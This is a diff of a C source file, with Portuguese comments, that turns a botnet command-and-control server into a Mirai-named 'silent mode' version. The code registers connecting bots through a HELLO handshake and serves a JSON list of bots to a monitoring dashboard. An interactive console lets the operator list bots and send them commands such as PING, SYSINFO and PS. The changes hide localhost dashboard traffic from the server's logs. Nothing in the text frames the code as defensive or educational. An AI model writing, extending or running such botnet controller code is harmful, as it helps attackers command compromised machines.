@@ -1,5 +1,5 @@
-// c2_server_v2.c - Servidor C2 com suporte a API de Monitoramento
-// Compilar: gcc c2_server_v2.c -o c2_server
+// c2_server_mirai.c - Versão Silenciosa (Anti-Flood no Terminal)
+// Compilar: gcc c2_server_mirai.c -o c2_server
 // Uso: ./c2_server 5555
 
 #include <stdio.h>
@@ -18,25 +18,24 @@ typedef struct {
     char id[64];
     char ip[INET_ADDRSTRLEN];
     time_t last_seen;
-    char status[10]; // "online", "idle"
 } bot_t;
 
-// Função auxiliar para construir JSON manual (sem bibliotecas externas)
+// Função auxiliar para construir JSON manual
 void send_bot_list_json(int fd, bot_t *bots, int count) {
     char json_buf[8192];
     strcpy(json_buf, "[");
     
     int first = 1;
     for (int i = 0; i < count; i++) {
-        if (bots[i].fd > 0 && strcmp(bots[i].id, "MONITOR") != 0) {
+        // Só lista bots reais (ignora slots vazios ou MONITOR)
+        if (bots[i].fd > 0 && strcmp(bots[i].id, "MONITOR") != 0 && strcmp(bots[i].id, "UNKNOWN") != 0) {
             if (!first) strcat(json_buf, ",");
             
             char entry[256];
-            // Calcula latência fake ou tempo desde ultimo contato
             int latency = (int)(time(NULL) - bots[i].last_seen); 
             
             snprintf(entry, sizeof(entry), 
-                "{\"id\": \"%s\", \"ip\": \"%s\", \"status\": \"online\", \"last_seen\": \"%ld\", \"latency\": %d}",
+                "{\"id\": \"%s\", \"ip\": \"%s\", \"last_seen\": \"%ld\", \"latency\": %d}",
                 bots[i].id, bots[i].ip, bots[i].last_seen, latency);
             
             strcat(json_buf, entry);
@@ -82,13 +81,15 @@ int main(int argc, char *argv[]) {
         perror("listen"); return 1;
     }
 
-    printf("[C2] Servidor v2 (API Ready) na porta %d\n", port);
+    printf("[C2] Servidor pronto na porta %d (Modo Silencioso)\n", port);
+    printf("[C2] Aguardando bots... (O Dashboard não vai gerar logs aqui)\n");
 
     while (1) {
         FD_ZERO(&read_fds);
         FD_SET(server_fd, &read_fds);
         max_fd = server_fd;
 
+        // Adiciona descritores à lista de leitura
         for (int i = 0; i < bot_count; i++) {
             if (bots[i].fd > 0) {
                 FD_SET(bots[i].fd, &read_fds);
@@ -96,9 +97,12 @@ int main(int argc, char *argv[]) {
             }
         }
 
+        // Menu não bloqueante (truque simples usando select com timeout zero para stdin seria ideal, 
+        // mas aqui mantemos o select de rede e checamos stdin depois ou aceitamos que o menu aparece nos logs)
+        
         if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) break;
 
-        // Nova conexão
+        // 1. Nova conexão chegando
         if (FD_ISSET(server_fd, &read_fds)) {
             struct sockaddr_in cli_addr;
             socklen_t cli_len = sizeof(cli_addr);
@@ -108,56 +112,106 @@ int main(int argc, char *argv[]) {
                 if (bot_count < MAX_BOTS) {
                     bots[bot_count].fd = new_fd;
                     strcpy(bots[bot_count].id, "UNKNOWN");
-                    // Salva o IP
                     inet_ntop(AF_INET, &(cli_addr.sin_addr), bots[bot_count].ip, INET_ADDRSTRLEN);
                     bots[bot_count].last_seen = time(NULL);
+                    
+                    // MODIFICAÇÃO: Só loga se NÃO for localhost (evita flood do monitor)
+                    if (strcmp(bots[bot_count].ip, "127.0.0.1") != 0) {
+                        printf("[C2] Nova conexão: %s (fd=%d)\n", bots[bot_count].ip, new_fd);
+                    }
+                    
                     bot_count++;
-                    printf("[C2] Conexão de %s (fd=%d)\n", bots[bot_count-1].ip, new_fd);
                 } else {
                     close(new_fd);
                 }
             }
         }
 
-        // Mensagens dos Clientes
+        // 2. Processar mensagens dos clientes
         for (int i = 0; i < bot_count; i++) {
             int fd = bots[i].fd;
             if (fd > 0 && FD_ISSET(fd, &read_fds)) {
                 int n = recv(fd, buffer, sizeof(buffer)-1, 0);
+                
+                // Cliente desconectou
                 if (n <= 0) {
-                    printf("[C2] Desconectado: %s\n", bots[i].id);
+                    // Só avisa desconexão se for bot real
+                    if (strcmp(bots[i].ip, "127.0.0.1") != 0) {
+                        printf("[C2] Bot desconectado: %s\n", bots[i].id);
+                    }
                     close(fd);
                     bots[i].fd = -1;
-                } else {
+                } 
+                // Mensagem recebida
+                else {
                     buffer[n] = '\0';
                     bots[i].last_seen = time(NULL);
 
-                    // Handshake
+                    // Verifica Handshake
                     if (strncmp(bots[i].id, "UNKNOWN", 7) == 0) {
                         if (strncmp(buffer, "HELLO ", 6) == 0) {
                             char *id_ptr = buffer + 6;
                             id_ptr[strcspn(id_ptr, "\r\n")] = 0;
                             
-                            // Se for o MONITOR (Dashboard), enviamos a lista JSON e não registramos como bot normal
+                            // SE FOR O DASHBOARD (MONITOR)
                             if (strcmp(id_ptr, "MONITOR") == 0) {
-                                printf("[C2] API Dashboard solicitou dados.\n");
+                                // NÃO printa nada aqui para evitar flood
                                 send_bot_list_json(fd, bots, bot_count);
-                                // O monitor não fica persistente na lista de "ataque", mas mantemos a conexão aberta ou fechamos?
-                                // Vamos fechar após enviar para simplificar
                                 close(fd);
-                                bots[i].fd = -1; 
-                            } else {
+                                bots[i].fd = -1; // Libera o slot imediatamente
+                            } 
+                            // SE FOR BOT REAL
+                            else {
                                 strncpy(bots[i].id, id_ptr, sizeof(bots[i].id)-1);
                                 send(fd, "OK\n", 3, 0);
-                                printf("[C2] Bot registrado: %s\n", bots[i].id);
+                                printf("[C2] Bot REGISTRADO: %s\n", bots[i].id);
+                                
+                                // Re-imprime o menu para o usuário não se perder
+                                printf("\nComandos: l (listar), s (selecionar), q (sair)\n> ");
+                                fflush(stdout);
                             }
                         }
                     } else {
-                        // Log de resposta de bot
-                        printf("[%s] %s\n", bots[i].id, buffer);
+                        // Resposta de comando vindo de um Bot já registrado
+                        printf("\n===== Resposta de %s =====\n%s\n==========================\n> ", bots[i].id, buffer);
+                        fflush(stdout);
                     }
                 }
             }
+        }
+        
+        // Pequena verificação de entrada do teclado (Polling simples)
+        struct timeval tv = {0, 0};
+        fd_set input_fds;
+        FD_ZERO(&input_fds);
+        FD_SET(STDIN_FILENO, &input_fds);
+        
+        if (select(STDIN_FILENO + 1, &input_fds, NULL, NULL, &tv) > 0) {
+             if (fgets(buffer, sizeof(buffer), stdin)) {
+                if (buffer[0] == 'l') {
+                    printf("\n--- Bots Conectados ---\n");
+                    for (int k=0; k<bot_count; k++) {
+                        if (bots[k].fd > 0 && strcmp(bots[k].ip, "127.0.0.1") != 0)
+                            printf("[%d] ID: %s | IP: %s\n", k, bots[k].id, bots[k].ip);
+                    }
+                    printf("> "); fflush(stdout);
+                } else if (buffer[0] == 's') {
+                    printf("Índice do bot: "); fflush(stdout);
+                    fgets(buffer, sizeof(buffer), stdin);
+                    int idx = atoi(buffer);
+                    if (idx >= 0 && idx < bot_count && bots[idx].fd > 0) {
+                        printf("Comando para %s (PING/SYSINFO/PS): ", bots[idx].id); fflush(stdout);
+                        char cmd[64];
+                        fgets(cmd, sizeof(cmd), stdin);
+                        send(bots[idx].fd, cmd, strlen(cmd), 0);
+                        printf("[*] Comando enviado. Aguardando resposta...\n");
+                    } else {
+                        printf("[-] Índice inválido.\n> "); fflush(stdout);
+                    }
+                } else if (buffer[0] == 'q') {
+                    break;
+                }
+             }
         }
     }
     return 0;
